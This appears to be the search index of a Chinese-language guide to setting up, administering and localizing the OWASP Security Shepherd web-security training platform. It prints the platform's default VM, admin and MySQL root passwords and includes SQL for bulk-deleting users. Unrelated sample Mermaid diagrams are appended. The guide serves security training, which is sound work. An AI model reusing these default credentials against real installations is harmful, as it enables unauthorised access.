{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"OWSAP shepherd \u00b6 \u8bf4\u660e :\u672c\u6587\u6863\u4e3b\u8981\u9488\u5bf9\u5f53\u524d\u6700\u65b0\u7248owaspSecurityShepherd_v3.1_VM\u8fdb\u884c\u7f16\u5199,\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f\u5176\u4ed6\u7248\u672c\uff0c\u53ef\u80fd\u5b58\u5728\u7565\u5fae\u5dee\u5f02 \u4ecb\u7ecd \u00b6 OWASP security shepherd\u9879\u76ee\u662fweb\u548c\u79fb\u52a8\u5e94\u7528\u5b89\u5168\u57f9\u8bad\u5e73\u53f0.\u8be5\u9879\u76ee\u7684\u76ee\u7684\u57f9\u517b\u548c\u63d0\u9ad8\u4e0d\u540c\u6280\u80fd\u4eba\u7fa4\u7684\u5b89\u5168\u610f\u8bc6\u3002\u8ba9AppSec\u65b0\u624b\u6216\u7ecf\u9a8c\u4e30\u5bcc\u7684\u7814\u53d1/\u6d4b\u8bd5\u5de5\u7a0b\u5e08\u63d0\u9ad8\u4ed6\u4eec\u7684\u5b89\u5168\u6d4b\u8bd5\u6280\u80fd\uff0c\u6210\u4e3a\u5b89\u5168\u4e13\u5bb6\u3002 OWSAP shepherd github\u4ee3\u7801 \u4f18\u70b9 \u00b6 \u4f5c\u8005\u81ea\u8eab\u5217\u4e3e\u4e86\u5f88\u591a: owasp shepherd \u4f18\u70b9 \u6574\u7406\u51e0\u6761\u8ba4\u4e3a\u6bd4\u8f83\u4e3b\u8981\u7684: \u6301\u7eed\u66f4\u65b0 \u8fd9\u4e2a\u9879\u76ee\u4f5c\u8005\u8fd8\u5728\u6301\u7eed\u66f4\u65b0\uff0c\u4e0d\u65ad\u52a0\u5165\u6700\u65b0\u4ea7\u751f\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u975e\u5e38\u96be\u5f97 \u4ecegithub issus\u770b,\u53c2\u4e0e\u7684\u7528\u6237\u975e\u5e38\u591a\uff0c\u53d7\u5230\u4e86\u5e7f\u5927\u7528\u6237\u7684\u559c\u7231 \u8986\u76d6web\u548c\u79fb\u52a8\u6f0f\u6d1e \u540c\u65f6\u6709web\u548c\u79fb\u52a8\u6f0f\u6d1e\u7684\u9776\u573a\u6bd4\u8f83\u5c11\u89c1 \u6f0f\u6d1e\u5206\u7b49\u7ea7 \u53ef\u4ee5\u9002\u5408\u4e0d\u540c\u9700\u6c42\u7684\u540c\u5b66\u5b66\u4e60\uff0c\u5982\u7814\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66(\u4ec5\u4f7f\u7528\u524d\u4e24\u4e2a\u7b49\u7ea7) \u6e90\u4ee3\u7801\u5f00\u6e90\u4e14\u5b89\u5168 \u6e90\u4ee3\u7801\u5f00\u6e90\uff0c\u53ef\u6839\u636e\u81ea\u8eab\u9700\u6c42\u8fdb\u884c\u4fee\u6539 \u6e90\u4ee3\u7801\u4e2d\u589e\u52a0\u4e86\u5f88\u591a\u5b89\u5168\u9632\u62a4\uff0c\u4f5c\u4e3a\u6e90\u4ee3\u7801\u5ba1\u8ba1\u3001\u5b89\u5168\u5f00\u53d1\u7684\u5178\u8303\u9879\u76ee \u5b89\u88c5 \u00b6 vmware\u865a\u62df\u673a\u5b89\u88c5 \u4e0b\u8f7d\u5f53\u524d\u6700\u65b0\u72483.1 vm owaspSecurityShepherd_v3.1_VM.zip \u4f7f\u7528vmware\u6253\u5f00 \u4e3b\u673a\u767b\u5f55\u8d26\u53f7 \u7528\u6237\u540d:securityshepherd \u5bc6\u7801: shepherd3.1 \u8be5\u8d26\u53f7\u53ef\u4ee5\u4f7f\u7528sudo \u5207\u6362\u5230root\u547d\u4ee4:sudo su root \u7f51\u7edc\u914d\u7f6e \u5982\u679c\u65e0\u6cd5\u8054\u7f51\uff0c\u64cd\u4f5c\u5982\u4e0b: \u67e5\u770b\u6240\u6709\u7f51\u5361\u4fe1\u606f ifconfig -a \u5f00\u542f\u7f51\u5361 sudo dhclient ens33 \u6ce8:ens33 \u4e3a\u7f51\u5361\u540d \u8f93\u5165\u4f60\u7684ip\u5730\u5740 \u5373\u53ef\u8bbf\u95ee \u9ed8\u8ba4\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801:admin/password docker\u5b89\u88c5 \u53c2\u8003\u5b98\u65b9\u6587\u6863 owasp shepherd docker\u5b89\u88c5 ubuntu \u5b89\u88c5\u5982\u4e0b # Install pre-reqs sudo apt install git maven docker docker-compose default-jdk # Clone the github repository git clone https://github.com/OWASP/SecurityShepherd.git # Change directory into the local copy of the repository \u975e\u5e38\u975e\u5e38\u91cd\u8981 cd SecurityShepherd # Add current user to the docker group (don't have to run docker with sudo) sudo gpasswd -a $USER docker # Run maven to generate the WAR and HTTPS Cert. mvn -Pdocker clean install -DskipTests # Build the docker images, docker network and bring up the environment docker-compose up \u7531\u4e8e\u6d4b\u8bd5\u65f6\uff0c\u4f7f\u7528\u7684\u662fshepherd3.1 \u6e90\u4ee3\u7801\u8fdb\u884c\u5b89\u88c5\uff0c\u5c06\u6e90\u4ee3\u7801\u653e\u5230\u4e86\u975eSecurityShepherd\u8def\u5f84,\u5f53\u505aSQL\u6ce8\u5165\u76f8\u5173\u9898\u76ee\u65f6\uff0c\u4f1a\u663e\u793a\u5982\u4e0b\u9519\u8bef\u4fe1\u606f secshep_tomcat | java.sql.SQLException: Access denied for user 'firstBloodyMessL'@'secshep_tomcat.\u6587\u4ef6\u8def\u5f84\u540d' (using password: YES) \u67e5\u770b github issus ,\u6700\u540e\u5c06\u5f53\u524d\u8def\u5f84\u4fee\u6539\u4e3a SecurityShepherd \u5f97\u4ee5\u89e3\u51b3 \u5141\u8bb8HTTP\u8bbf\u95ee \u9ed8\u8ba4\u5b89\u88c5\u540e,tomcat\u5f3a\u5236\u5c06http\u8bf7\u6c42\u8df3\u8f6c\u5230https \u5f00\u542fhttp\u8bf7\u6c42\u65b9\u6cd5: \u5220\u9664 docker\\tomcat\\webxml.patch \u4e2d security-constraint \u6807\u7b7e\u76f8\u5173\u5185\u5bb9 \u7ba1\u7406 \u00b6 \u9996\u6b21\u767b\u5f55\u540e\u53f0 \u00b6 \u9700\u8981\u4fee\u6539\u9ed8\u8ba4\u5bc6\u7801:admin/password \u5f00\u542f\"\u4f5c\u5f0a\"\u6a21\u5f0f \u00b6 \u7ba1\u7406\u5458\u540e\u53f0\u914d\u7f6e: Admin->Configuration->Configure Cheat Sheets \u53ef\u4ee5\u5141\u8bb8\u5728\u505a\u9898\u65f6\uff0c\u76f4\u63a5\u67e5\u770b\u7b54\u6848\u63d0\u793a\u4fe1\u606f \u5f00\u542f\u79ef\u5206\u529f\u80fd \u00b6 Admin->Configuration->Scoreboard Configuration \u6bcf\u4e2a\u9898\u90fd\u6709\u5206\u6570\uff0c\u4f5c\u5bf9\u4e86\u83b7\u5f97\u5bf9\u5e94\u5206\u6570 \u4fee\u6539\u505a\u9898\u6a21\u5f0f \u00b6 Admin->Module Management->Change Module Layout \u6709CTF\u6a21\u5f0f: \u5fc5\u987b\u505a\u5b8c\u5f53\u524d\u9898 \u624d\u80fd\u67e5\u770b\u4e0b\u4e00\u4e2a\u9898 Tournament\u6a21\u5f0f: \u4f1a\u663e\u793a\u6240\u6709\u9898, \u53ef\u81ea\u7531\u9009\u62e9 Open Floor\u6a21\u5f0f: \u5206\u4e3a\u8bfe\u7a0b\u548c\u6311\u6218 \u4e24\u4e2a\u5927\u7684\u7ea7\u522b\u8fdb\u884c\u5c55\u793a \u5f00/\u5173 \u67d0\u4e2a\u9898 \u00b6 Admin->Module Management->Open and Close Modules \u9009\u4e2d\u5bf9\u5e94\u7684\u9898(\u652f\u6301\u591a\u9009)\u53ef\u4ee5\u6253\u5f00\u6216\u5173\u95ed\u5bf9\u5e94\u7684\u9898 \u5f00/\u5173 \u67d0\u7c7b\u9898 \u00b6 Admin->Module Management->Open or Close by Category \u9009\u4e2d\u5bf9\u5e94\u7684\u9898(\u652f\u6301\u591a\u9009)\u53ef\u4ee5\u6253\u5f00\u6216\u5173\u95ed\u5bf9\u5e94\u7684\u9898 \u521b\u5efa\u65b0\u7528\u6237 \u00b6 \u5fc5\u987b\u5148\u521b\u5efa\u4e2a\u5206\u7c7b Admin->User Management->Create Class \u5728\u521b\u5efa\u7528\u6237 Admin->User Management->Add Players \u6279\u91cf\u5220\u9664\u7528\u6237 \u9ed8\u8ba4mysql\u8d26\u53f7\u548c\u5bc6\u7801: root/CowSaysMoo \u6839\u636e\u5206\u7c7b\u5220\u9664\u7528\u6237 delete from users where classId in (select classId from class where className = '2021-8'); update users set userPass=SHA2('admin',512) where classId in (select classId from class where className = '2021-8'); \u4e8c\u6b21\u5f00\u53d1 \u00b6 \u6c49\u5316\u65b9\u6cd5 \u00b6 \u8be5\u9879\u76ee\u652f\u6301\u9ed8\u8ba4\u652f\u6301\u591a\u79cd\u8bed\u8a00,\u5305\u62ec\u82f1\u8bed\u548c\u6c49\u8bed\u7b49\uff0c\u5177\u4f53\u5b9e\u73b0\u53ef\u4ee5\u53c2\u8003\u5b98\u65b9wiki. owasp shepherd\u4e2d\u6587\u7248 \u76f8\u5173\u7684\u9875\u9762\u5c55\u793a\u4fe1\u606f\u4f1a\u4fdd\u5b58\u5230*.properties\u6587\u4ef6\u4e2d \u5982\u82f1\u6587\u9875\u9762\u4fe1\u606f\u4fdd\u5b58\u5728 zf8ed52591579339e590e0726c7b24009f3ac54cdff1b81a65db1688d86efb3a.properties \u5bf9\u5e94\u4e2d\u6587\u9875\u9762\u4fe1\u606f\u4fdd\u5b58\u5728\u76f8\u540c\u76ee\u5f55\u4e0b zf8ed52591579339e590e0726c7b24009f3ac54cdff1b81a65db1688d86efb3a_zh.properties src/jsp/challenges/HASH.jsp\u7684\u9875\u9762\u914d\u7f6e\u4fdd\u5b58\u5728src/i18n/challenges/HASH.properties \u4e8c\u6b21\u5f00\u53d1\u6b65\u9aa4 \u00b6 \u4e0b\u8f7d\u6e90\u4ee3\u7801 wget https://github.com/OWASP/SecurityShepherd/archive/refs/tags/v3.1.tar.gz \u7531\u4e8e\u6211\u4f7f\u7528\u7684\u662fowaspSecurityShepherd_v3.1_VM\u73af\u5883\uff0c\u6240\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684\u6e90\u4ee3\u7801\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4\u672a\u77e5\u9519\u8bef \u4f7f\u7528\u4efb\u4f55\u7f16\u8f91\u5668\u4fee\u6539\u4ee3\u7801 \u91cd\u65b0\u6253\u5305\u4ee3\u7801 mvn -Pdocker clean install -DskipTests yum -y install maven \u6216 apt install maven - \u66ff\u6362\u6587\u4ef6\u90e8\u7f72 web\u76ee\u5f55\u5728 /var/lib/tomcat8/webapps/ROOT/ cp target/owaspSecurityShepherd.war /var/lib/tomcat8/webapps/ROOT.war - \u91cd\u542ftomcat\u670d\u52a1 /etc/init.d/tomcat8 restart \u4e8c\u6b21\u5f00\u53d1\u8bb0\u5f55 \u00b6 \u6dfb\u52a0\u6c49\u5316\u6587\u4ef6 src/main/resources/i18n/challenges/insecureCryptoStorage/insecureCryptoStorage_zh.properties src/main/resources/i18n/challenges/directObject/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c_zh.properties src/main/resources/i18n/challenges/poorValidation/poorValidationStrings_zh.properties src/main/resources/i18n/challenges/injection/e1e109444bf5d7ae3d67b816538613e64f7d0f51c432a164efc8418513711b0a_zh.properties src/main/resources/i18n/challenges/sessionManagement/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a_zh.properties src/main/resources/i18n/challenges/urlAccess/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99_zh.properties src/main/resources/i18n/text_zh.properties src/main/webapp/login.jsp src/main/webapp/index.jsp \u4fee\u6539 src/main/java/servlets/module/SolutionSubmit.java src/main/java/servlets/module/RefreshMenu.java \u6dfb\u52a0\u8f93\u51fa\u7f16\u7801\u4ee3\u7801 \u89e3\u51b3\u8fd4\u56de\u9875\u9762\u4e71\u7801\u95ee\u9898 response.setContentType(\"text/html;charset=utf-8\"); owasp Shepherd \u4e2d\u6587\u4e71\u7801issues \u53ea\u5f00\u653e\u524d\u4e24\u4e2a\u7b49\u7ea7\u7684web\u5b89\u5168\u6f0f\u6d1e \u5728\u6587\u4ef6 src/main/java/dbProcs/Getter.java \u5b9a\u4e49\u4e86\u6bcf\u4e2a\u7b49\u7ea7\u5bf9\u5e94\u7684rank\u503c,\u7b49\u7ea7\u8d8a\u9ad8\uff0crank\u503c\u8d8a\u9ad8 private static int fieldTrainingCap = 45; private static int privateCap = 80; private static int corporalCap = 105; private static int sergeantCap = 130; private static int lieutenantCap = 145; private static int majorCap = 175; private static int admiralCap = 999; \u8fd9\u4e2a\u503c\u5bf9\u5e94core\u6570\u636e\u5e93 modules \u8868\u7684 incrementalRank \u56e0\u6b64\u53ea\u9700\u8981\u7f16\u5199\u4e24\u6761SQL\u53ef\u4ee5\u5b9e\u73b0\u9700\u6c42 update modules set moduleStatus='closed' update modules set moduleStatus='open' where incrementalRank < 80 and moduleCategory not like '%Mobile%' \u5982\u679c\u4f60\u4f7f\u7528docker\u90e8\u7f72\u73af\u5883,\u76f4\u63a5\u8fde\u63a5docker\u5bb9\u5668 docker exec -it secshep_mysql /bin/bash mysql -uroot -p #mysql \u5bc6\u7801\u662f CowSaysMoo use core update modules set moduleStatus='closed' update modules set moduleStatus='open' where incrementalRank < 80 and moduleCategory not like '%Mobile%' \u7b14\u8bb0 \u00b6 \u5bf9owasp shepherd\u5b8c\u6574\u5b66\u4e60\u8fc7\u7a0b\u8fdb\u884c\u8bb0\u5f55\uff0c\u5305\u62ec\u9898\u76ee\u7406\u89e3\u3001\u6e90\u4ee3\u7801\u89e3\u6790\u3001\u89e3\u9898\u8fc7\u7a0b\u3001\u4fee\u590d\u65b9\u6848\u7b49\u591a\u65b9\u9762\u5bf9\u4e00\u4e2a\u9898\u8fdb\u884c\u5b66\u4e60 \u901a\u8fc7\u5bf9v3.1(2018\u5e74\u7248\u672c),web\u6f0f\u6d1e\u76f8\u5173\u9898\u8fdb\u884c\u5b66\u4e60\uff0c\u603b\u4f53\u611f\u89c9\u8fd9\u5957\u7ec3\u4e60\u9898\u975e\u5e38\u4e0d\u9519\uff0c\u9002\u5408\u4e0d\u540c\u9700\u6c42\u3001\u4e0d\u540c\u77e5\u8bc6\u80cc\u666f\u7684\u7684\u5b89\u5168\u4ece\u4e1a\u8005 \u5176\u4e2d\u96be\u514d\u6709\u4e00\u4e9b\u96be\u4ee5\u7406\u89e3\u7684\u9898\uff0c\u4ece\u7b54\u6848\u6765\u8bf4\u4e5f\u6bd4\u8f83\u96be\u7406\u89e3\uff0c\u4e0d\u77e5\u9053\u4e00\u4e9b\u4fe1\u606f\u4ece\u54ea\u91cc\u800c\u6765.... \u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u5c06\u505a\u8fc7\u7684\u9898\u90fd\u52a0\u5165\u5230\u5b66\u4e60\u6587\u6863\u4e2d, \u5e0c\u671b\u5bf9\u521d\u5b66\u8005\u6709\u6240\u5e2e\u52a9 \u5176\u4e2d\u6709\u51e0\u4e2a\u6ce8\u610f\u70b9: - CSRF \u6709\u5f88\u591a\u529f\u80fd\u9700\u8981\u53e6\u4e00\u4e2a\u8d26\u53f7\u914d\u5408\u624d\u80fd\u5b8c\u6210\uff0c\u56e0\u6b64\u6ca1\u6709\u505a\u5b8c - \u4e00\u4e9b\u96be\u4ee5\u7406\u89e3\u7684\u9898(\u770b\u5b8c\u63d0\u793a\u4ecd\u7136\u4e0d\u77e5\u9053\u600e\u4e48\u56de\u4e8b\u7684)\uff0c\u6ca1\u6709\u6574\u7406\u5b66\u4e60\u7b14\u8bb0 Session Management Challenge 8 Insecure Cryptographic Storage Challenge 4 Security Misconfig Cookie Flag Insecure Cryptographic Storage Home Made Keys graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!]; sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good! stateDiagram-v2 [*] --> Active state Active { [*] --> NumLockOff NumLockOff --> NumLockOn : EvNumLockPressed NumLockOn --> NumLockOff : EvNumLockPressed -- [*] --> CapsLockOff CapsLockOff --> CapsLockOn : EvCapsLockPressed CapsLockOn --> CapsLockOff : EvCapsLockPressed -- [*] --> ScrollLockOff ScrollLockOff --> ScrollLockOn : EvScrollLockPressed ScrollLockOn --> ScrollLockOff : EvScrollLockPressed } classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() } erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses graph TD; A-->B; A-->C; B-->D; C-->D;","title":"shepherd \u9879\u76ee\u4ecb\u7ecd"},{"location":"index.html#owsap-shepherd","text":"\u8bf4\u660e :\u672c\u6587\u6863\u4e3b\u8981\u9488\u5bf9\u5f53\u524d\u6700\u65b0\u7248owaspSecurityShepherd_v3.1_VM\u8fdb\u884c\u7f16\u5199,\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f\u5176\u4ed6\u7248\u672c\uff0c\u53ef\u80fd\u5b58\u5728\u7565\u5fae\u5dee\u5f02","title":"OWSAP shepherd"},{"location":"index.html#_1","text":"OWASP security shepherd\u9879\u76ee\u662fweb\u548c\u79fb\u52a8\u5e94\u7528\u5b89\u5168\u57f9\u8bad\u5e73\u53f0.\u8be5\u9879\u76ee\u7684\u76ee\u7684\u57f9\u517b\u548c\u63d0\u9ad8\u4e0d\u540c\u6280\u80fd\u4eba\u7fa4\u7684\u5b89\u5168\u610f\u8bc6\u3002\u8ba9AppSec\u65b0\u624b\u6216\u7ecf\u9a8c\u4e30\u5bcc\u7684\u7814\u53d1/\u6d4b\u8bd5\u5de5\u7a0b\u5e08\u63d0\u9ad8\u4ed6\u4eec\u7684\u5b89\u5168\u6d4b\u8bd5\u6280\u80fd\uff0c\u6210\u4e3a\u5b89\u5168\u4e13\u5bb6\u3002 OWSAP shepherd github\u4ee3\u7801","title":"\u4ecb\u7ecd"},{"location":"index.html#_2","text":"\u4f5c\u8005\u81ea\u8eab\u5217\u4e3e\u4e86\u5f88\u591a: owasp shepherd \u4f18\u70b9 \u6574\u7406\u51e0\u6761\u8ba4\u4e3a\u6bd4\u8f83\u4e3b\u8981\u7684: \u6301\u7eed\u66f4\u65b0 \u8fd9\u4e2a\u9879\u76ee\u4f5c\u8005\u8fd8\u5728\u6301\u7eed\u66f4\u65b0\uff0c\u4e0d\u65ad\u52a0\u5165\u6700\u65b0\u4ea7\u751f\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u975e\u5e38\u96be\u5f97 \u4ecegithub issus\u770b,\u53c2\u4e0e\u7684\u7528\u6237\u975e\u5e38\u591a\uff0c\u53d7\u5230\u4e86\u5e7f\u5927\u7528\u6237\u7684\u559c\u7231 \u8986\u76d6web\u548c\u79fb\u52a8\u6f0f\u6d1e \u540c\u65f6\u6709web\u548c\u79fb\u52a8\u6f0f\u6d1e\u7684\u9776\u573a\u6bd4\u8f83\u5c11\u89c1 \u6f0f\u6d1e\u5206\u7b49\u7ea7 \u53ef\u4ee5\u9002\u5408\u4e0d\u540c\u9700\u6c42\u7684\u540c\u5b66\u5b66\u4e60\uff0c\u5982\u7814\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66(\u4ec5\u4f7f\u7528\u524d\u4e24\u4e2a\u7b49\u7ea7) \u6e90\u4ee3\u7801\u5f00\u6e90\u4e14\u5b89\u5168 \u6e90\u4ee3\u7801\u5f00\u6e90\uff0c\u53ef\u6839\u636e\u81ea\u8eab\u9700\u6c42\u8fdb\u884c\u4fee\u6539 \u6e90\u4ee3\u7801\u4e2d\u589e\u52a0\u4e86\u5f88\u591a\u5b89\u5168\u9632\u62a4\uff0c\u4f5c\u4e3a\u6e90\u4ee3\u7801\u5ba1\u8ba1\u3001\u5b89\u5168\u5f00\u53d1\u7684\u5178\u8303\u9879\u76ee","title":"\u4f18\u70b9"},{"location":"index.html#_3","text":"vmware\u865a\u62df\u673a\u5b89\u88c5 \u4e0b\u8f7d\u5f53\u524d\u6700\u65b0\u72483.1 vm owaspSecurityShepherd_v3.1_VM.zip \u4f7f\u7528vmware\u6253\u5f00 \u4e3b\u673a\u767b\u5f55\u8d26\u53f7 \u7528\u6237\u540d:securityshepherd \u5bc6\u7801: shepherd3.1 \u8be5\u8d26\u53f7\u53ef\u4ee5\u4f7f\u7528sudo \u5207\u6362\u5230root\u547d\u4ee4:sudo su root \u7f51\u7edc\u914d\u7f6e \u5982\u679c\u65e0\u6cd5\u8054\u7f51\uff0c\u64cd\u4f5c\u5982\u4e0b: \u67e5\u770b\u6240\u6709\u7f51\u5361\u4fe1\u606f ifconfig -a \u5f00\u542f\u7f51\u5361 sudo dhclient ens33 \u6ce8:ens33 \u4e3a\u7f51\u5361\u540d \u8f93\u5165\u4f60\u7684ip\u5730\u5740 \u5373\u53ef\u8bbf\u95ee \u9ed8\u8ba4\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801:admin/password docker\u5b89\u88c5 \u53c2\u8003\u5b98\u65b9\u6587\u6863 owasp shepherd docker\u5b89\u88c5 ubuntu \u5b89\u88c5\u5982\u4e0b # Install pre-reqs sudo apt install git maven docker docker-compose default-jdk # Clone the github repository git clone https://github.com/OWASP/SecurityShepherd.git # Change directory into the local copy of the repository \u975e\u5e38\u975e\u5e38\u91cd\u8981 cd SecurityShepherd # Add current user to the docker group (don't have to run docker with sudo) sudo gpasswd -a $USER docker # Run maven to generate the WAR and HTTPS Cert. mvn -Pdocker clean install -DskipTests # Build the docker images, docker network and bring up the environment docker-compose up \u7531\u4e8e\u6d4b\u8bd5\u65f6\uff0c\u4f7f\u7528\u7684\u662fshepherd3.1 \u6e90\u4ee3\u7801\u8fdb\u884c\u5b89\u88c5\uff0c\u5c06\u6e90\u4ee3\u7801\u653e\u5230\u4e86\u975eSecurityShepherd\u8def\u5f84,\u5f53\u505aSQL\u6ce8\u5165\u76f8\u5173\u9898\u76ee\u65f6\uff0c\u4f1a\u663e\u793a\u5982\u4e0b\u9519\u8bef\u4fe1\u606f secshep_tomcat | java.sql.SQLException: Access denied for user 'firstBloodyMessL'@'secshep_tomcat.\u6587\u4ef6\u8def\u5f84\u540d' (using password: YES) \u67e5\u770b github issus ,\u6700\u540e\u5c06\u5f53\u524d\u8def\u5f84\u4fee\u6539\u4e3a SecurityShepherd \u5f97\u4ee5\u89e3\u51b3 \u5141\u8bb8HTTP\u8bbf\u95ee \u9ed8\u8ba4\u5b89\u88c5\u540e,tomcat\u5f3a\u5236\u5c06http\u8bf7\u6c42\u8df3\u8f6c\u5230https \u5f00\u542fhttp\u8bf7\u6c42\u65b9\u6cd5: \u5220\u9664 docker\\tomcat\\webxml.patch \u4e2d security-constraint \u6807\u7b7e\u76f8\u5173\u5185\u5bb9","title":"\u5b89\u88c5"},{"location":"index.html#_4","text":"","title":"\u7ba1\u7406"},{"location":"index.html#_5","text":"\u9700\u8981\u4fee\u6539\u9ed8\u8ba4\u5bc6\u7801:admin/password","title":"\u9996\u6b21\u767b\u5f55\u540e\u53f0"},{"location":"index.html#_6","text":"\u7ba1\u7406\u5458\u540e\u53f0\u914d\u7f6e: Admin->Configuration->Configure Cheat Sheets \u53ef\u4ee5\u5141\u8bb8\u5728\u505a\u9898\u65f6\uff0c\u76f4\u63a5\u67e5\u770b\u7b54\u6848\u63d0\u793a\u4fe1\u606f","title":"\u5f00\u542f\"\u4f5c\u5f0a\"\u6a21\u5f0f"},{"location":"index.html#_7","text":"Admin->Configuration->Scoreboard Configuration \u6bcf\u4e2a\u9898\u90fd\u6709\u5206\u6570\uff0c\u4f5c\u5bf9\u4e86\u83b7\u5f97\u5bf9\u5e94\u5206\u6570","title":"\u5f00\u542f\u79ef\u5206\u529f\u80fd"},{"location":"index.html#_8","text":"Admin->Module Management->Change Module Layout \u6709CTF\u6a21\u5f0f: \u5fc5\u987b\u505a\u5b8c\u5f53\u524d\u9898 \u624d\u80fd\u67e5\u770b\u4e0b\u4e00\u4e2a\u9898 Tournament\u6a21\u5f0f: \u4f1a\u663e\u793a\u6240\u6709\u9898, \u53ef\u81ea\u7531\u9009\u62e9 Open Floor\u6a21\u5f0f: \u5206\u4e3a\u8bfe\u7a0b\u548c\u6311\u6218 \u4e24\u4e2a\u5927\u7684\u7ea7\u522b\u8fdb\u884c\u5c55\u793a","title":"\u4fee\u6539\u505a\u9898\u6a21\u5f0f"},{"location":"index.html#_9","text":"Admin->Module Management->Open and Close Modules \u9009\u4e2d\u5bf9\u5e94\u7684\u9898(\u652f\u6301\u591a\u9009)\u53ef\u4ee5\u6253\u5f00\u6216\u5173\u95ed\u5bf9\u5e94\u7684\u9898","title":"\u5f00/\u5173 \u67d0\u4e2a\u9898"},{"location":"index.html#_10","text":"Admin->Module Management->Open or Close by Category \u9009\u4e2d\u5bf9\u5e94\u7684\u9898(\u652f\u6301\u591a\u9009)\u53ef\u4ee5\u6253\u5f00\u6216\u5173\u95ed\u5bf9\u5e94\u7684\u9898","title":"\u5f00/\u5173 \u67d0\u7c7b\u9898"},{"location":"index.html#_11","text":"\u5fc5\u987b\u5148\u521b\u5efa\u4e2a\u5206\u7c7b Admin->User Management->Create Class \u5728\u521b\u5efa\u7528\u6237 Admin->User Management->Add Players \u6279\u91cf\u5220\u9664\u7528\u6237 \u9ed8\u8ba4mysql\u8d26\u53f7\u548c\u5bc6\u7801: root/CowSaysMoo \u6839\u636e\u5206\u7c7b\u5220\u9664\u7528\u6237 delete from users where classId in (select classId from class where className = '2021-8'); update users set userPass=SHA2('admin',512) where classId in (select classId from class where className = '2021-8');","title":"\u521b\u5efa\u65b0\u7528\u6237"},{"location":"index.html#_12","text":"","title":"\u4e8c\u6b21\u5f00\u53d1"},{"location":"index.html#_13","text":"\u8be5\u9879\u76ee\u652f\u6301\u9ed8\u8ba4\u652f\u6301\u591a\u79cd\u8bed\u8a00,\u5305\u62ec\u82f1\u8bed\u548c\u6c49\u8bed\u7b49\uff0c\u5177\u4f53\u5b9e\u73b0\u53ef\u4ee5\u53c2\u8003\u5b98\u65b9wiki. owasp shepherd\u4e2d\u6587\u7248 \u76f8\u5173\u7684\u9875\u9762\u5c55\u793a\u4fe1\u606f\u4f1a\u4fdd\u5b58\u5230*.properties\u6587\u4ef6\u4e2d \u5982\u82f1\u6587\u9875\u9762\u4fe1\u606f\u4fdd\u5b58\u5728 zf8ed52591579339e590e0726c7b24009f3ac54cdff1b81a65db1688d86efb3a.properties \u5bf9\u5e94\u4e2d\u6587\u9875\u9762\u4fe1\u606f\u4fdd\u5b58\u5728\u76f8\u540c\u76ee\u5f55\u4e0b zf8ed52591579339e590e0726c7b24009f3ac54cdff1b81a65db1688d86efb3a_zh.properties src/jsp/challenges/HASH.jsp\u7684\u9875\u9762\u914d\u7f6e\u4fdd\u5b58\u5728src/i18n/challenges/HASH.properties","title":"\u6c49\u5316\u65b9\u6cd5"},{"location":"index.html#_14","text":"\u4e0b\u8f7d\u6e90\u4ee3\u7801 wget https://github.com/OWASP/SecurityShepherd/archive/refs/tags/v3.1.tar.gz \u7531\u4e8e\u6211\u4f7f\u7528\u7684\u662fowaspSecurityShepherd_v3.1_VM\u73af\u5883\uff0c\u6240\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684\u6e90\u4ee3\u7801\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4\u672a\u77e5\u9519\u8bef \u4f7f\u7528\u4efb\u4f55\u7f16\u8f91\u5668\u4fee\u6539\u4ee3\u7801 \u91cd\u65b0\u6253\u5305\u4ee3\u7801 mvn -Pdocker clean install -DskipTests yum -y install maven \u6216 apt install maven - \u66ff\u6362\u6587\u4ef6\u90e8\u7f72 web\u76ee\u5f55\u5728 /var/lib/tomcat8/webapps/ROOT/ cp target/owaspSecurityShepherd.war /var/lib/tomcat8/webapps/ROOT.war - \u91cd\u542ftomcat\u670d\u52a1 /etc/init.d/tomcat8 restart","title":"\u4e8c\u6b21\u5f00\u53d1\u6b65\u9aa4"},{"location":"index.html#_15","text":"\u6dfb\u52a0\u6c49\u5316\u6587\u4ef6 src/main/resources/i18n/challenges/insecureCryptoStorage/insecureCryptoStorage_zh.properties src/main/resources/i18n/challenges/directObject/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c_zh.properties src/main/resources/i18n/challenges/poorValidation/poorValidationStrings_zh.properties src/main/resources/i18n/challenges/injection/e1e109444bf5d7ae3d67b816538613e64f7d0f51c432a164efc8418513711b0a_zh.properties src/main/resources/i18n/challenges/sessionManagement/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a_zh.properties src/main/resources/i18n/challenges/urlAccess/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99_zh.properties src/main/resources/i18n/text_zh.properties src/main/webapp/login.jsp src/main/webapp/index.jsp \u4fee\u6539 